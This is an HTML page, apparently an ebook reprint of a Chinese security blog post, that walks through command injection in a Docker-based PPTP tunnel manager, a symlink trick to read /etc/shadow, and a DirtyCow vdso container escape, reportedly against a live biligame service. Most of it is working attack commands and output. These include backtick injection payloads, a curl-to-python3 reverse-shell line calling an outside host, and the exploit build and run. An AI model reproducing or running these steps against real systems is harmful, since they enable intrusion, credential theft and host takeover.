@@ -1,0 +1,130 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>Tunnel Manager - From RCE to Docker Escape</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>Tunnel Manager - From RCE to Docker Escape</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzI5MzY2MzM0Mw==&amp;mid=2247484039&amp;idx=1&amp;sn=86521ce22060c386585d46892e06dcfc&amp;chksm=ec6fe587db186c9132bc90d87497d7aea7e7a01eef62818582546a09ed62dd8f9324003010f3&amp;scene=126&amp;sessionid=1681378770#rd">http://mp.weixin.qq.com/s?__biz=MzI5MzY2MzM0Mw==&amp;mid=2247484039&amp;idx=1&amp;sn=86521ce22060c386585d46892e06dcfc&amp;chksm=ec6fe587db186c9132bc90d87497d7aea7e7a01eef62818582546a09ed62dd8f9324003010f3&amp;scene=126&amp;sessionid=1681378770#rd</a></blockquote><h2 style="margin-top: 1.3em; margin-bottom: 1em; font-weight: bold; font-size: 1.4em; border-bottom: 1px solid rgb(238, 238, 238);">TL; DR</h2><p style="margin-bottom: 1.2em !important;">        题目有些标题党了。这个漏洞是我在测试 
+biligame 是发现的，此程序监听在 8081 端口，是一个管理 PPTP 的 Web 
+Interface。首先，通过黑盒测试，发现存在一个在 Docker 容器内的命令执行，接着通过 banner 搜索，在 Github 
+上找到源代码，通过阅读源码，实现了 Docker 容器外的文件读取，最后通过 DirtyCow 来逃逸 Docker。<br/>非常 CTF 的一个魔幻经历，于是写了一篇文章来分享一下。</p><h2 style="margin-top: 1.3em; margin-bottom: 1em; font-weight: bold; font-size: 1.4em; border-bottom: 1px solid rgb(238, 238, 238);">RCE</h2><p style="margin-bottom: 1.2em !important;">访问目标站，很贴心的列出了 endpoints：<br/><img data-src="http://mmbiz.qpic.cn/mmbiz_jpg/fwNqC4xHXIqxj69rAuIibMpZmh59DLibsuYoicdqATEgK4buAKTccwNk17AaQmP3rp09Pice6sXSWDsOtMhffm5BvA/0?wx_fmt=jpeg" class="" data-ratio="0.5172413793103449" data-w="406" data-type="jpeg" src="../Images/2b8dedef98bcc985d591569d60aa3329.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_jpg/fwNqC4xHXIqxj69rAuIibMpZmh59DLibsuYoicdqATEgK4buAKTccwNk17AaQmP3rp09Pice6sXSWDsOtMhffm5BvA/0?wx_fmt=jpeg"/><br/>首先测试一下其正常功能：</p><p style="margin-bottom: 1.2em !important;">列出 VPN：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code class="hljs language-shell" style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); background: none 0% 0% repeat scroll rgb(0, 36, 81); color: white; padding: 0.5em; display: block !important;">bash-3.2$ curl target:8081/tunnels 2&gt; /dev/null | jq
+[
+  {
+    "status": "INITIAL",
+    "external": null,
+    "local": "172.17.0.2",
+    "dns1": null,
+    "tunnel_ip": null,
+    "user": "[...]",
+    "server": "[...]",
+    "id": "[...]",
+    "dns2": null,
+    "port": [...]
+  },
+  ...
+]</code></pre><p style="margin-bottom: 1.2em !important;">添加 VPN：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code class="hljs language-shell" style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); background: none 0% 0% repeat scroll rgb(0, 36, 81); color: white; padding: 0.5em; display: block !important;">bash-3.2$ curl target:8081/tunnel --data ""
+&lt;h1&gt;500 Internal Server Error&lt;/h1&gt;Param: name not found!
+
+bash-3.2$ curl target:8081/tunnel --data "name=test"
+&lt;h1&gt;500 Internal Server Error&lt;/h1&gt;Param: server not found
+
+...
+
+bash-3.2$ curl target:8081/tunnel --data "name=test&amp;server=a.asf.loli.club&amp;user=asd&amp;pass=123&amp;port=5555"
+{"status":"INITIAL","external":null,"local":"172.17.0.5","dns1":null,"tunnel_ip":null,"user":"asd","server":"a.asf.loli.club","id":"test","dns2":null,"port":5555}</code></pre><p style="margin-bottom: 1.2em !important;">通过报错显示出需要的参数：name、server、user、pass、port。</p><p style="margin-bottom: 1.2em !important;">删除 VPN：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code class="hljs language-shell" style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); background: none 0% 0% repeat scroll rgb(0, 36, 81); color: white; padding: 0.5em; display: block !important;">bash-3.2$ curl -XDELETE target:8081/tunnel/test
+test</code></pre><p style="margin-bottom: 1.2em !important;">边缘测试，显示报错信息：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code class="hljs language-shell" style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); background: none 0% 0% repeat scroll rgb(0, 36, 81); color: white; padding: 0.5em; display: block !important;">bash-3.2$ curl target:8081/tunnel --data "name=test&amp;server=a.asf.loli.club&amp;user=asd&amp;pass=123&amp;port=5555"
+{"status":"INITIAL","external":null,"local":"172.17.0.5","dns1":null,"tunnel_ip":null,"user":"asd","server":"a.asf.loli.club","id":"test","dns2":null,"port":5555}
+
+bash-3.2$ curl target:8081/tunnel --data "name=test&amp;server=a.asf.loli.club&amp;user=asd&amp;pass=123&amp;port=5555"
+{"Err":"docker: Error response from daemon: Conflict. The name \"/test\" is already in use by container 1dfabf508870215bb0592e6a8666bd47498157ed631baf54d54cbb0ecf5dcc4b. You have to remove (or rename) that container to be able to reuse that name..\nSee 'docker run --help'.\n"}</code></pre><p style="margin-bottom: 1.2em !important;">发现是 Docker 的报错信息，而且根据回显，推测是后端直接调用 Docker 命令。<br/>有调用就有 RCE，于是我尝试在 <code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">:name</code> 参数进行命令注入，但是失败了，推测应该是有 escape。</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code class="hljs language-shell" style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); background: none 0% 0% repeat scroll rgb(0, 36, 81); color: white; padding: 0.5em; display: block !important;">bash-3.2$ curl -XDELETE target:8081/tunnel/\`a\`test
+&lt;h1&gt;500 Internal Server Error&lt;/h1&gt;Error response from daemon: No such container: `a`test
+
+bash-3.2$ curl -XDELETE target:8081/tunnel/\'\`a\`test
+&lt;h1&gt;500 Internal Server Error&lt;/h1&gt;Error response from daemon: No such container: '`a`test</code></pre><p style="margin-bottom: 1.2em !important;">接着我测试在添加 VPN 出的命令注入，不出所料，存在：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code class="hljs language-shell" style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); background: none 0% 0% repeat scroll rgb(0, 36, 81); color: white; padding: 0.5em; display: block !important;">bash-3.2$ curl target:8081/tunnel  --data "name=test&amp;server=\`whoami\`-bilibili.asf.loli.club&amp;user=asd&amp;pass=123&amp;port=5555"
+{"status":"INITIAL","external":null,"local":"172.17.0.5","dns1":null,"tunnel_ip":null,"user":"asd","server":"`whoami`-bilibili.asf.loli.club","id":"test","dns2":null,"port":5555}</code></pre><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_jpg/fwNqC4xHXIqxj69rAuIibMpZmh59DLibsu6NCvibEeWD7ibicIxMibUD13HFkxhMHmSgXVDW7cPMhWkCcK3nmiccAvNBQ/0?wx_fmt=jpeg" class="" data-ratio="0.5198776758409785" data-w="327" data-type="jpeg" src="../Images/7c040b7ef7d95c0a24545126cc9187ea.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_jpg/fwNqC4xHXIqxj69rAuIibMpZmh59DLibsu6NCvibEeWD7ibicIxMibUD13HFkxhMHmSgXVDW7cPMhWkCcK3nmiccAvNBQ/0?wx_fmt=jpeg"/><br/>高兴了大概 1 分钟，我就发现，其实我命令执行的地方是在一个 Docker 容器内：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code class="hljs language-shell" style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); background: none 0% 0% repeat scroll rgb(0, 36, 81); color: white; padding: 0.5em; display: block !important;">bash-3.2$ curl target:8081/tunnel  --data "name=test&amp;server=\`ls%20/.docker*\`-bilibili.asf.loli.club&amp;user=asd&amp;pass=123&amp;port=5555"
+{"status":"INITIAL","external":null,"local":"172.17.0.5","dns1":null,"tunnel_ip":null,"user":"asd","server":"`whoami`-bilibili.asf.loli.club","id":"test","dns2":null,"port":5555}</code></pre><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_jpg/fwNqC4xHXIqxj69rAuIibMpZmh59DLibsuQichNnF1Gtibb4Vib3rPCq1aMKHJCUrk7rqwhw8ZY3w8q5fxIwPBdItWA/0?wx_fmt=jpeg" class="" data-ratio="0.3726541554959786" data-w="373" data-type="jpeg" src="../Images/6dd1c2fe39dd872e8f147883bf27ca12.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_jpg/fwNqC4xHXIqxj69rAuIibMpZmh59DLibsuQichNnF1Gtibb4Vib3rPCq1aMKHJCUrk7rqwhw8ZY3w8q5fxIwPBdItWA/0?wx_fmt=jpeg"/>  </p><h2 style="margin-top: 1.3em; margin-bottom: 1em; font-weight: bold; font-size: 1.4em; border-bottom: 1px solid rgb(238, 238, 238);">文件读取</h2><p style="margin-bottom: 1.2em !important;">通过搜索 banner，我找到了这个网站的源代码：https://github.com/bearice/tunnel-manager/blob/master/src/API.hs。<br/>通过阅读源码，我发现了一个比较有意思的未公开 API：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code class="hljs language-shell" style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); background: none 0% 0% repeat scroll rgb(0, 36, 81); color: white; padding: 0.5em; display: block !important;">tunnelLogs :: String -&gt; IO String
+tunnelLogs name = do
+    let path = flags_dataDir &lt;/&gt; name &lt;.&gt; "log"
+    sh $ "tail " ++ escape path
+
+...
+
+get "/tunnel/:name/logs" $ do
+  name &lt;- param "name"
+  logs &lt;- liftIO $ tunnelLogs name
+  text $ L.pack logs</code></pre><p style="margin-bottom: 1.2em !important;">在调用这个 API 时，会读取 /data/:name.log。再看看创建 Docker 时候：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code class="hljs language-shell" style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); background: none 0% 0% repeat scroll rgb(0, 36, 81); color: white; padding: 0.5em; display: block !important;">tunnelCreate :: String -&gt; String -&gt; String -&gt; String -&gt; Maybe String -&gt; IO (Either String TunnelInfo)
+tunnelCreate ""   _      _    _    _ = return $ Left "Name must not be empty"
+tunnelCreate _    ""     _    _    _ = return $ Left "Server must not be empty"
+tunnelCreate name server user pass port = do
+    let n = escape name
+    let portDef = case port of
+            Just p  -&gt; "-p "++p++":3128"
+            Nothing -&gt; "-p 3128"
+
+    r &lt;- shExJoin ["docker run -d --restart=always"
+                  ,"--device /dev/ppp"
+                  ,"--cap-add=net_admin"
+                  ,"--name",n,"-h",n
+                  ,"-v "++flags_dataDir++":/data", portDef, flags_image
+                  ,"/init.sh ", escapeMany [server,user,pass]
+                  ]
+    case r of
+        Left err -&gt; return $ Left err
+        Right _  -&gt; tunnelInfo name</code></pre><p style="margin-bottom: 1.2em !important;">注意这一行：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code class="hljs language-shell" style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); background: none 0% 0% repeat scroll rgb(0, 36, 81); color: white; padding: 0.5em; display: block !important;">,"-v "++flags_dataDir++":/data", portDef, flags_image</code></pre><p style="margin-bottom: 1.2em !important;">由于这个 API 运行在容器外，但是容器内的 /data 可以操控，于是通过创建软链接即可读取到容器外的文件。<br/>在容器内：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code class="hljs language-shell" style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); background: none 0% 0% repeat scroll rgb(0, 36, 81); color: white; padding: 0.5em; display: block !important;">root@fff2:/data# rm fff.log &amp;&amp; ln -s /etc/shadow fff.log
+ln -s /etc/shadow fff.log</code></pre><p style="margin-bottom: 1.2em !important;">接着访问 logs：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code class="hljs language-verilog" style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); background: none 0% 0% repeat scroll rgb(0, 36, 81); color: white; padding: 0.5em; display: block !important;">bash-3.2$ curl target:8081/tunnel/fff/logs
+nobody:*:16176:0:99999:7:::
+libuuid:!:16176:0:99999:7:::
+syslog:*:16176:0:99999:7:::
+messagebus:*:16179:0:99999:7:::
+landscape:*:16179:0:99999:7:::
+sshd:*:16179:0:99999:7:::
+ubuntu:$6$7yyw0fAK$[...]5.Urq81:17134:0:99999:7:::
+ntp:*:16179:0:99999:7:::
+dnsmasq:*:16179:0:99999:7:::
+colord:*:16179:0:99999:7:::</code></pre><p style="margin-bottom: 1.2em !important;">Bingo，至此通过 Docker 配合 API 的文件读取完成。</p><h2 style="margin-top: 1.3em; margin-bottom: 1em; font-weight: bold; font-size: 1.4em; border-bottom: 1px solid rgb(238, 238, 238);">Escape!</h2><p style="margin-bottom: 1.2em !important;">但是，满足吗？<br/>我是不满足的，文件读取还只是 tail 的一部分，并不能威胁到服务器的核心安全。<br/>通过一些信息收集，我发现此服务器内核版本较低，可能可以通过 DirtyCow (CVE-2016-5195) 来进行 Docker 逃逸。</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code class="hljs language-shell" style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); background: none 0% 0% repeat scroll rgb(0, 36, 81); color: white; padding: 0.5em; display: block !important;">root@fff2:/data# uname -a
+Linux fff2 3.13.0-88-generic #135-Ubuntu SMP Wed Jun 8 21:10:42 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</code></pre><p style="margin-bottom: 1.2em !important;">内核更新时间是 2016 年 6 月，而 DirtyCow 是在 2016 年 10 月，感觉看到了希望。<br/>不过在进行逃逸之前，需要清除一些小障碍。</p><p style="margin-bottom: 1.2em !important;">调用 API 后，Docker 运行的是 ppp 命令，在超过超时时间后，就会断开 shell。由于需要编译 payload，那么必须安装 gcc 以及 make，但是时间超过了超时时间。<br/>不过根据 API，通过 <code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">:name/down</code>、<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">:name/up</code>，可以 start/stop Docker 容器，通过修改 init.sh 为反弹 shell 的脚本，接着 docker stop，再 start 后就会获得一个稳定的 shell：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code class="hljs language-shell" style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); background: none 0% 0% repeat scroll rgb(0, 36, 81); color: white; padding: 0.5em; display: block !important;">root@fff2:/data# cat /init.sh
+#!/bin/bash
+curl ricterz.me:8080/|python3</code></pre><p style="margin-bottom: 1.2em !important;">接着：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code class="hljs language-shell" style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); background: none 0% 0% repeat scroll rgb(0, 36, 81); color: white; padding: 0.5em; display: block !important;">bash-3.2$ curl target:8081/tunnel/fff2/down
+...
+bash-3.2$ curl target:8081/tunnel/fff2/up</code></pre><p style="margin-bottom: 1.2em !important;">安装好 gcc、nasm、make 后，编译 payload 运行失败。</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code class="hljs language-shell" style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); background: none 0% 0% repeat scroll rgb(0, 36, 81); color: white; padding: 0.5em; display: block !important;">root@fff2:/data/dirtycow-vdso-master# ./0xdeadbeef 172.17.0.8:1234
+[*] payload target: 172.17.0.8:1234
+[-] failed to patch payload's ip</code></pre><p style="margin-bottom: 1.2em !important;">虽然不知道发生了什么，但是我有一种感觉，就是 exp 作者更新了版本导致 exp 挂掉。于是我下载了老版本的 exp，编译后成功获得 shell：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code class="hljs language-shell" style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); background: none 0% 0% repeat scroll rgb(0, 36, 81); color: white; padding: 0.5em; display: block !important;"># git clone https://github.com/scumjr/dirtycow-vdso/
+Cloning into 'dirtycow-vdso'...
+remote: Counting objects: 99, done.
+remote: Total 99 (delta 0), reused 0 (delta 0), pack-reused 99
+Unpacking objects: 100% (99/99), done.
+Checking connectivity... done.
+# cd dirtycow-vdso
+# git reset --hard ef252dee4784758a494b4286e5ff1dac26e57c7d
+HEAD is now at ef252de add another prologue
+# sed -i 's/0x0100007f/0x80011ac/g' payload.s
+# make
+make
+nasm -f bin -o payload payload.s
+xxd -i payload payload.h
+cc -o 0xdeadbeef.o -c 0xdeadbeef.c -Wall
+cc -o 0xdeadbeef 0xdeadbeef.o -lpthread
+# ./0xdeadbeef
+[*] exploit: patch 1/2
+[*] vdso successfully backdoored
+[*] exploit: patch 2/2
+[*] vdso successfully backdoored
+[*] waiting for reverse connect shell...
+[*] enjoy!
+[*] restore: patch 2/2
+ifconfig
+docker0   Link encap:Ethernet  HWaddr [...]
+          inet addr:172.17.0.1  Bcast:0.0.0.0  Mask:255.255.0.0
+          ...
+
+eth0      Link encap:Ethernet  HWaddr [...]
+          inet addr:10.10.177.79  Bcast:10.10.255.255  Mask:255.255.0.0
+          ...</code></pre><p style="margin-bottom: 1.2em !important;">至此，逃逸成功。</p><section class="" data-tools="135&#x7F16;&#x8F91;&#x5668;" data-id="86357" style="max-width: 100%; box-sizing: border-box; color: rgb(62, 62, 62); font-size: 16px; white-space: normal; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: &#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;; border-width: 0px; border-style: none; border-color: initial; word-wrap: break-word !important;"><section style="max-width: 100%; text-align: center; box-sizing: border-box !important; word-wrap: break-word !important;"><section style="display: inline-block; max-width: 100%; width: 192px; box-sizing: border-box !important; word-wrap: break-word !important;"><section class="" data-tools="135编辑器" data-id="86357" style="max-width: 100%; box-sizing: border-box; border-width: 0px; border-style: none; border-color: initial; word-wrap: break-word !important;"><section style="max-width: 100%; box-sizing: border-box !important; word-wrap: break-word !important;"><section style="display: inline-block; max-width: 100%; width: 192px; box-sizing: border-box !important; word-wrap: break-word !important;"><img class="" data-ratio="0.125" data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoEGQVnQojUKQ4J1WMicVDoZmbX5NFgic65Bo4SIYUK4ib9ibvpyoaPJibpkS2Q8Q24DicBfEtnh6xBcFSw/640.png?" data-type="png" data-w="600" style="display: inline; box-sizing: border-box !important; word-wrap: break-word !important; visibility: visible !important; width: 192px !important;" title="墨迹晕染分割线" width="192px" src="../Images/c96a1b435221f7e6cf4c4e3eca199d9e.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoEGQVnQojUKQ4J1WMicVDoZmbX5NFgic65Bo4SIYUK4ib9ibvpyoaPJibpkS2Q8Q24DicBfEtnh6xBcFSw/640.png?"/></section></section></section></section></section></section><p style="max-width: 100%; min-height: 1em; color: rgb(62, 62, 62); font-size: 16px; white-space: normal; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: &#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;; box-sizing: border-box !important; word-wrap: break-word !important;"><br style="max-width: 100%; box-sizing: border-box !important; word-wrap: break-word !important;"/></p><p style="max-width: 100%; min-height: 1em; color: rgb(62, 62, 62); font-size: 16px; white-space: normal; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: &#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;; box-sizing: border-box !important; word-wrap: break-word !important;"><img class="" data-ratio="0.3036773428232503" data-s="300,640" data-src="http://mmbiz.qpic.cn/mmbiz_jpg/fwNqC4xHXIoEGQVnQojUKQ4J1WMicVDoZ0Y7FsbxeE68njy7pfZf9hstOTLqPHS1uljxrnicvns89MRJ7DMQowOg/640.jpeg?" data-type="jpeg" data-w="843" style="line-height: 25.6px; box-sizing: border-box !important; word-wrap: break-word !important; visibility: visible !important; width: auto !important;" width="auto" src="../Images/4f6f4b18070490b9670250379d20693d.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_jpg/fwNqC4xHXIoEGQVnQojUKQ4J1WMicVDoZ0Y7FsbxeE68njy7pfZf9hstOTLqPHS1uljxrnicvns89MRJ7DMQowOg/640.jpeg?"/></p>
+        
+</body>
+</html>
